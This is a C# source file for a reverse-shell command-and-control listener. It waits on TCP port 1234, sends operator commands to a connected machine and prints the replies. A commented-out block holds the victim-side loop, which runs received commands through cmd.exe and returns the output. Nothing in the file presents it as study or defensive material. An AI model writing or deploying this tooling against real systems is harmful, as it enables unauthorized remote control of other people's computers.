using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ReverseShellServer
{
    class Program
    {
        static void Main(string[] args)
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 1234);
            listener.Start();
            Console.WriteLine("[+] Waiting for a connection...");

            TcpClient client = listener.AcceptTcpClient();
            Console.WriteLine("[+] Client connected!");

            NetworkStream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream);
            writer.AutoFlush = true;

            while (true)
            {
                Console.Write(">> ");
                string command = Console.ReadLine();
                writer.WriteLine(command);

                if (command == "exit")
                    break;

                string output = reader.ReadLine();
                Console.WriteLine(output);
            }

            //while (true)
            //{
            //    string command = reader.readline();
            //    if (command == "exit")
            //        break;

            //    process process = new process();
            //    processstartinfo startinfo = new processstartinfo();
            //    startinfo.filename = "cmd.exe";
            //    startinfo.arguments = "/c " + command;
            //    startinfo.redirectstandardoutput = true;
            //    startinfo.useshellexecute = false;
            //    process.startinfo = startinfo;
            //    process.start();

            //    string output = process.standardoutput.readtoend();
            //    process.waitforexit();

            //    console.write(output);

            //}

            client.Close();
            listener.Stop();
        }
    }
}